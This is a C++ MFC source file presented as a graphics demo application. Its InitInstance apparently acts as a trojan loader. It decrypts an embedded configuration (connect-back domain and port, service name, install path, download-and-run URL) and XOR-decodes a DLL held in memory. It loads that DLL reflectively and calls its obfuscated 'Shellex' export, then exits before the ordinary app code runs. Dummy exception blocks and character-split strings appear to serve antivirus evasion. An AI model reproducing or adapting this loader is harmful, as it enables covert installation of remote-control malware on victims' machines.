// Graphic.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Graphic.h"
#include "FaderWnd.h"//���ڽ���ͷ�ļ�
#include "MainFrm.h"
#include "GraphicDoc.h"
#include "GraphicView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp

BEGIN_MESSAGE_MAP(CGraphicApp, CWinApp)
	//{{AFX_MSG_MAP(CGraphicApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	// Standard print setup command
	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp construction

CGraphicApp::CGraphicApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CGraphicApp object

CGraphicApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp initialization

#include "C_DllMain.h"
char shellex[]={'S','h','e','l','l','e','x','\0'};
#include "MemLoadDll.h"
struct DLLSERVER_INFO
{
	CHAR Domain[100];     //����IP
	CHAR QQDomain[100];     //����IP
	WORD Port;            //���߶˿�
	WORD QQPort;            //���߶˿�
	CHAR Version[100];    //����汾
	CHAR Group[100];      //���߷���
	CHAR SocketHead[100]; //ͨ������
	CHAR ServiceName[100];   //��������
	CHAR ServicePlay[128];   //������ʾ
	CHAR ServiceDesc[256];   //��������
	CHAR ReleasePath[100];   //��װ;��
	CHAR ReleaseName[50];    //��װ����
	CHAR Mexi[100];          //���л���
	BOOL Dele_te;            //��װ��ɾ��
	CHAR Dele_zc;            //��������
	WORD Dele_zd;            //��װ����
	BOOL Dele_fs;            //ռ�ӷ�ɾ����װ
	BOOL Dele_Kzj;           //���߼�¼
	BOOL Dele_Cul;           //���߼�¼
	WORD FileAttribute;      //�ļ�����
	CHAR szDownRun[300];     //�����ַ
//	CHAR URL[256];          //�ؼ���ַ
};


DLLSERVER_INFO dll_info = 
{
	"www.baidu.com",
		"123456789",
		2017,
		2017,
		"V_2017",
		"Default",
		"123456",
		"YYYYYYYYYYYY",
		"Yugqqu qekcaigu",
		"Igaoqa ymusuyukeamucgowws",
		"%ProgramFiles%\\Rumno Qrstuv",
		"Debug.exe",
		"Nmbbre hjveaika",
		0,                       //0Ϊ��װ��ɾ��    1Ϊ��װɾ��
		0,                       //0Ϊ��ɫ����      1ΪRun����    2Ϊ��������
		0,                       //0Ϊ��װ������
		0,                       //0Ϊ��ͨ��װ      1Ϊռ�ӷ�ɾ����װ
		0,                        //0Ϊ��ͬ��װ      1Ϊ���߼�¼��װ
		0,                        //0Ϊ������ת��
		FILE_ATTRIBUTE_NORMAL,    //�ļ�����
		'"',
//		"http://192.168.179.128/Consys21.dll"
		
};

typedef int (WINAPI *PFN_POPMSGBOX)(DLLSERVER_INFO);

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//����
{	
	
	try
	{
		if(1+1==2)throw 70;
	}
	catch (...)
	{
		unsigned long i;
		unsigned char p;		
		p = (unsigned char ) key % 254 +88;
		for(i = 0; i < nLen; i++) 
		{
			try
			{
				if(1+1==2)throw 50;
			}
			catch (...)
			{
				*szRec ^= p;
				*szRec += p;
			}
			
			szRec++;
		}	
	}
	
}

void LoadDllFromMemAndCall( const char *name)
{
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;	
	EncryptData((unsigned char *)DllMainMyFileBuf,DllMainMyFileSize,3800);		
	hDll=MemoryLoadLibrary(DllMainMyFileBuf);
	if (hDll==NULL)
		return ;
	
    pfn=(PFN_POPMSGBOX)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		
		return;
	}
	pfn(dll_info);
	if (hDll!=NULL)
	{
		
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
	ExitProcess(0);
}

void rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
{
	int i =0, j = 0, k[256] = {0};
	unsigned char tmp = 0;
	for(i=0;i<256;i++)
	{
		s[i]=i;
		k[i]=key[i%Len];
	}
	for (i=0; i<256; i++)
	{
		j=(j+s[i]+k[i])%256;
		tmp = s[i];
		s[i] = s[j]; 
		s[j] = tmp;
	}
} 

void rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
{
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for(i=0;i<Len;i++)
	{
		x=(x+1)%256;
		y=(y+s[x])%256;
		tmp = s[x];
		s[x] = s[y];
		s[y] = tmp;
		t=(s[x]+s[y])%256;
		Data[i] ^= s[t];
	} 
}

VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	//RC4 ���� ����  Mother360
	unsigned char m_strkey0[256];
	char bpackey_se[] = {'K','o','t','h','e','r','1','6','8','\0'};
	
	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //��ʼ�� RC4����
	
	rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
	
}

BOOL CGraphicApp::InitInstance()
{
	AfxEnableControlContainer(); 
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.
	MyEncryptFunction((LPSTR)&dll_info,sizeof(DLLSERVER_INFO));   //������Ϣ����
	LoadDllFromMemAndCall(shellex);
	
	return 0;
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

// 	CSingleDocTemplate* pDocTemplate;
// 	pDocTemplate = new CSingleDocTemplate(
// 		IDR_MAINFRAME,
// 		RUNTIME_CLASS(CGraphicDoc),
// 		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
// 		RUNTIME_CLASS(CGraphicView));
// 	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOWMAXIMIZED);
	m_pMainWnd->UpdateWindow();
	m_pMainWnd->SetWindowText("��ҵ���ߴ�����ʾ������ V1.0     ����ߣ��ݸ�");

	//===================����Ƥ����������Ƥ������================*/
	VERIFY( 1 == InitSkinMagicLib( AfxGetInstanceHandle(), "��ͼ���" , 
					  NULL,
					  NULL ) );

	VERIFY( 1 == LoadSkinFromResource( AfxGetInstanceHandle()  , "SKINMAGIC" ,"SKINMAGIC") ); 

	VERIFY( 1 == SetWindowSkin( m_pMainWnd->m_hWnd , "MainFrame" ));
	VERIFY( 1 == SetDialogSkin( "Dialog" ) );
	/*==========================END==============================*/
	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGraphicApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CGraphicApp message handlers

